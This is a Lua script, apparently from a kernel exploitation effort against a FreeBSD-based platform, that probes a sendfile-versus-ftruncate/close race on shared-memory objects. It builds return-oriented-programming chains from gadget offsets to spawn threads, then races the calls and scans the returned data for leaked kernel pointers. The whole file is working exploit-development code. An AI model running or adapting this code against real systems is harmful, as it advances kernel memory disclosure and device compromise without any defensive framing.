-- CRASH_CLASS: MODERATE
-- PROBE 94b: sendfile vs ftruncate race on shm
--
-- sendfile(393) works on shm fds (probe 391d confirmed 16KB/page).
-- ftruncate(480) works on shm fds.
-- Race: main thread sendfile(shm_fd -> socket) a large region
-- while child thread ftruncate(shm_fd, 0) shrinks to zero.
-- sendfile reads pages from the vm_object - if ftruncate frees them
-- mid-transfer, sendfile may copy from freed/recycled pages.
-- Also test: close(shm_fd) from child while sendfile is in progress.

print("=== PROBE 94b: SENDFILE TRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E94B0, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(done, ms)
    for w = 1, ms * 10 do if (rd(N(done)) or 0) ~= 0 then return true end end
    return false
end

print("setup done")

-- Create a TCP socket pair for sendfile destination
-- We need a connected socket. Use socketpair(AF_UNIX, SOCK_STREAM)
local function make_stream_pair()
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
    return rd(N(sv)) or -1, rd(N(sv)+4) or -1
end

local SHM_SIZE = 0x40000  -- 256KB = 16 pages

-- ====== TEST A: sendfile vs ftruncate(0) ======
print("--- A: sendfile vs ftruncate ---")
local anomalies = 0

for iter = 1, 10 do
    if not alive() then print("DEAD_A " .. iter); break end

    -- Create shm object
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    if shm_fd < 0 then print("NOSHM " .. iter); break end

    -- Extend to 256KB
    pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)

    -- Write pattern data
    local map_ok, map_rv = pcall(function()
        return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
    end)
    local map_addr = map_ok and map_rv or nil
    local map_lo, map_hi = split(map_addr)
    if map_addr and map_hi < 0xFFFF then
        for p = 0, 15 do
            pcall(function()
                memory.write_dword(uint64(string.format("0x%X%08X", map_hi, map_lo + p * 0x4000)), 0xFACE0000 + p)
            end)
        end
        pcall(function() mk(73)(uint64(string.format("0x%X%08X", map_hi, map_lo)), uint64(SHM_SIZE)) end)
    end

    -- Create socket pair for sendfile dest
    local sock_r, sock_w = make_stream_pair()
    if sock_r < 0 then print("NOSOCK " .. iter); pcall(function() mk(6)(uint64(shm_fd)) end); break end

    -- Set socket to nonblocking so sendfile doesn't block forever
    local nb = memory.alloc(8); wd(N(nb), 1)
    pcall(function() mk(54)(uint64(sock_w), uint64(0x8004667E), uint64(N(nb))) end)

    local done = memory.alloc(8); wd(N(done), 0)

    -- Child: delay then ftruncate(shm_fd, 0)
    local child_calls = {}
    for d = 1, 3 do table.insert(child_calls, {20}) end  -- small delay
    table.insert(child_calls, {480, shm_fd, 0})  -- ftruncate to 0

    local ok_c = spawn_child(child_calls, N(done))
    if not ok_c then
        print("NOSPAWN " .. iter)
        pcall(function() mk(6)(uint64(shm_fd)) end)
        pcall(function() mk(6)(uint64(sock_r)) end)
        pcall(function() mk(6)(uint64(sock_w)) end)
        break
    end

    -- Main: sendfile(shm_fd -> sock_w, offset=0, nbytes=SHM_SIZE)
    -- sendfile(393): (fd, s, offset, nbytes, hdtr, sbytes, flags)
    local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
    local ok_sf, rv_sf = pcall(function()
        return mk(393)(uint64(shm_fd), uint64(sock_w), uint64(0), uint64(SHM_SIZE), uint64(0), uint64(N(sbytes)))
    end)
    local sf_ret = ok_sf and N(rv_sf) or -999
    if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end

    wait_done(done, 5000)

    -- Read how many bytes were sent
    local sent_lo = rd(N(sbytes)) or 0
    local sent_hi = rd(N(sbytes)+4) or 0
    if sent_lo < 0 then sent_lo = sent_lo + 0x100000000 end

    -- Read from the receive side to see what data came through
    local recv_buf = memory.alloc(0x10000)
    for j = 0, 0xFFFC, 4 do wd(N(recv_buf)+j, 0xDEADDEAD) end
    local ok_r, rv_r = pcall(function()
        return mk(3)(uint64(sock_r), uint64(N(recv_buf)), uint64(0x10000))
    end)
    local r_ret = ok_r and N(rv_r) or -999
    if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end

    print(string.format("  %d: sf_ret=%d sent=%d recv=%d", iter, sf_ret, sent_lo, r_ret))

    -- Scan received data for kernel pointers
    if r_ret > 0 then
        for j = 0, math.min(r_ret-1, 0xFFFC), 4 do
            local lo = rd(N(recv_buf)+j) or 0
            local hi = rd(N(recv_buf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                print(string.format("  %d KPTR +%04X: 0x%08X%08X", iter, j, hi, lo))
                anomalies = anomalies + 1
            end
        end
        -- Check if any unexpected data (not our FACE pattern or zero)
        for p = 0, math.min(math.floor(r_ret / 0x4000), 15) do
            local v = rd(N(recv_buf) + p * 0x4000) or 0
            if v < 0 then v = v + 0x100000000 end
            if v ~= 0xFACE0000 + p and v ~= 0 and v ~= 0xDEADDEAD then
                print(string.format("  %d UNEXPECTED page%d: 0x%08X", iter, p, v))
                anomalies = anomalies + 1
            end
        end
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)
    pcall(function() mk(6)(uint64(sock_r)) end)
    pcall(function() mk(6)(uint64(sock_w)) end)
end

-- ====== TEST B: sendfile vs close(shm_fd) ======
print("")
print("--- B: sendfile vs close(shm_fd) ---")
for iter = 1, 10 do
    if not alive() then print("DEAD_B " .. iter); break end

    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    if shm_fd < 0 then print("NOSHM " .. iter); break end

    pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)

    local sock_r, sock_w = make_stream_pair()
    if sock_r < 0 then pcall(function() mk(6)(uint64(shm_fd)) end); break end

    local nb = memory.alloc(8); wd(N(nb), 1)
    pcall(function() mk(54)(uint64(sock_w), uint64(0x8004667E), uint64(N(nb))) end)

    local done = memory.alloc(8); wd(N(done), 0)

    -- Child: delay then close(shm_fd)
    local child_calls = {}
    for d = 1, 3 do table.insert(child_calls, {20}) end
    table.insert(child_calls, {6, shm_fd})

    local ok_c = spawn_child(child_calls, N(done))
    if not ok_c then
        pcall(function() mk(6)(uint64(shm_fd)) end)
        pcall(function() mk(6)(uint64(sock_r)) end)
        pcall(function() mk(6)(uint64(sock_w)) end)
        break
    end

    local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
    local ok_sf, rv_sf = pcall(function()
        return mk(393)(uint64(shm_fd), uint64(sock_w), uint64(0), uint64(SHM_SIZE), uint64(0), uint64(N(sbytes)))
    end)
    local sf_ret = ok_sf and N(rv_sf) or -999
    if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end

    wait_done(done, 5000)

    local sent_lo = rd(N(sbytes)) or 0
    if sent_lo < 0 then sent_lo = sent_lo + 0x100000000 end

    local recv_buf = memory.alloc(0x10000)
    local ok_r, rv_r = pcall(function()
        return mk(3)(uint64(sock_r), uint64(N(recv_buf)), uint64(0x10000))
    end)
    local r_ret = ok_r and N(rv_r) or -999
    if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end

    print(string.format("  %d: sf_ret=%d sent=%d recv=%d", iter, sf_ret, sent_lo, r_ret))

    if r_ret > 0 then
        for j = 0, math.min(r_ret-1, 0xFFFC), 4 do
            local lo = rd(N(recv_buf)+j) or 0
            local hi = rd(N(recv_buf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                print(string.format("  %d KPTR +%04X: 0x%08X%08X", iter, j, hi, lo))
                anomalies = anomalies + 1
            end
        end
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)
    pcall(function() mk(6)(uint64(sock_r)) end)
    pcall(function() mk(6)(uint64(sock_w)) end)
end

print("")
print(string.format("total_anomalies=%d", anomalies))
print("alive=" .. tostring(alive()))
print("=== 94b COMPLETE ===")
